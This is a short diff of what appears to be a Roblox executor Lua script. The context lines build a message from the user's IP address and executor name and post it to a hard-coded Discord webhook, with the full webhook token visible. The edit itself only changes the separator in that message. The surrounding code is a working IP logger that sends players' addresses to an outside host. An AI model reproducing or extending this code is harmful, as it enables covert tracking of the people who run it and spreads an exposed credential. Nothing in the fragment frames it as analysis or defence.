@@ -21,7 +21,7 @@ local IP = IPBuffer
 local ExecutorName = identifyexecutor()
 url = "https://discord.com/api/webhooks/1095163481709367346/53F5jomSK588w5JRQoUtPCM3TvQiR78p_MjIeGcSTlyaDaTy_i3fqh_dw7NKEbk_PCVx"
 local data = {
-	["content"] = IP.." "..ExecutorName
+	["content"] = IP.." | "..ExecutorName
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 local headers = {
